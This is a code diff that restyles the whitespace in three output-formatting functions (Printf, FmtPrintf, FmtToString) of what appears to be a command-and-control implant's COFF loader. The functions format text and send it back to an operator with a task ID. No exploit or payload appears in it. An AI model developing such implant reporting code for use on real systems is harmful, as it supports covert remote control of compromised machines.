@@ -48,35 +48,35 @@ auto DECLFN Coff::Printf(
     CHAR* UUID     = nullptr;
     int   MsgSize  = 0;
     int   written  = 0;
-    CHAR* MsgBuff   = nullptr;
+    CHAR* MsgBuff  = nullptr;
 
     // measure
-    va_start(VaList, fmt);
-    MsgSize = Self->Msvcrt.vsnprintf(nullptr, 0, fmt, VaList);
-    va_end(VaList);
+    va_start( VaList, fmt );
+    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
+    va_end( VaList);
     if (MsgSize < 0) {
-        KhDbg("Printf: vsnprintf size probe failed"); goto _KH_END;
+        KhDbg( "Printf: vsnprintf size probe failed" ); goto _KH_END;
     }
 
     // allocate (size = MsgSize+1 for the NUL)
-    MsgBuff = (CHAR*)hAlloc(MsgSize + 1);
-    if (!MsgBuff) {
-        KhDbg("Printf: allocation failed"); goto _KH_END;
+    MsgBuff = ( CHAR* )hAlloc( MsgSize + 1 );
+    if ( !MsgBuff ) {
+        KhDbg( "Printf: allocation failed" ); goto _KH_END;
     }
 
     // format
-    va_start(VaList, fmt);
-    written = Self->Msvcrt.vsnprintf(MsgBuff, MsgSize + 1, fmt, VaList);
-    va_end(VaList);
-    if (written < 0) {
-        KhDbg("Printf: vsnprintf output failed"); goto _KH_END;
+    va_start( VaList, fmt );
+    written = Self->Msvcrt.vsnprintf( MsgBuff, MsgSize + 1, fmt, VaList );
+    va_end( VaList );
+    if ( written < 0 ) {
+        KhDbg( "Printf: vsnprintf output failed" ); goto _KH_END;
     }
     MsgBuff[written] = '\0';  // just in case
 
     // send
-    UUID = Self->Cf->GetTask(MemRange);
-    KhDbg("Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written);
-    Self->Pkg->SendMsg(UUID, MsgBuff, type);
+    UUID = Self->Cf->GetTask( MemRange );
+    KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
+    Self->Pkg->SendMsg( UUID, MsgBuff, type );
 
     // cleanup
 _KH_END:
@@ -151,15 +151,15 @@ auto DECLFN Coff::FmtPrintf(
     G_KHARON
 
     va_list Args;
-    va_start(Args, Data);
+    va_start( Args, Data);
 
     // NUL space in FmtToString
     size_t avail = Fmt->size - Fmt->length - 1;
-    int written = Self->Msvcrt.vsnprintf(Fmt->buffer, avail, Data, Args);
+    int written = Self->Msvcrt.vsnprintf( Fmt->buffer, avail, Data, Args );
 
-    va_end(Args);
-    if (written < 0) {
-        KhDbg("FmtPrintf: vsnprintf error");
+    va_end( Args );
+    if ( written < 0 ) {
+        KhDbg( "FmtPrintf: vsnprintf error" );
         return;
     }
 
@@ -186,28 +186,28 @@ auto DECLFN Coff::FmtToString(
     G_KHARON
 
     // verify buffer not NULL
-    if (!fmt || !fmt->original) {
-        if (size) *size = 0;
+    if ( !fmt || !fmt->original ) {
+        if ( size ) *size = 0;
         return nullptr;
     }
 
     // clamp invalid lengths
-    if (fmt->length < 0) {
-        KhDbg("FmtToString: negative length %d, resetting to 0", fmt->length);
+    if ( fmt->length < 0 ) {
+        KhDbg( "FmtToString: negative length %d, resetting to 0", fmt->length);
         fmt->length = 0;
     }
 
     // ensure room for trailing NUL
-    if ((UINT32)fmt->length >= fmt->size) {
+    if ( (UINT32)fmt->length >= fmt->size ) {
         // grow by max(length+1, existing_size*2)
-        UINT32 newSize = max((UINT32)fmt->length + 1, fmt->size * 2);
-        CHAR* newbuf = (CHAR*)hAlloc(newSize);
-        if (!newbuf) {
-            if (size) *size = 0;
+        UINT32 newSize = max( (UINT32)fmt->length + 1, fmt->size * 2 );
+        CHAR* newbuf = ( CHAR* )hAlloc( newSize );
+        if ( !newbuf ) {
+            if ( size ) *size = 0;
             return nullptr;
         }
-        Mem::Copy(newbuf, fmt->original, fmt->length);
-        hFree(fmt->original);
+        Mem::Copy( newbuf, fmt->original, fmt->length );
+        hFree( fmt->original );
         fmt->original = newbuf;
         fmt->size     = newSize;
     }
@@ -215,11 +215,11 @@ auto DECLFN Coff::FmtToString(
     // null-terminate
     fmt->original[fmt->length] = '\0';
 
-    if (size) {
+    if ( size ) {
         *size = fmt->length;
     }
 
-    KhDbg("FmtToString: length=%d, buffer=\"%s\"", fmt->length, fmt->original);
+    KhDbg( "FmtToString: length=%d, buffer=\"%s\"", fmt->length, fmt->original );
     return fmt->original;
 }
 
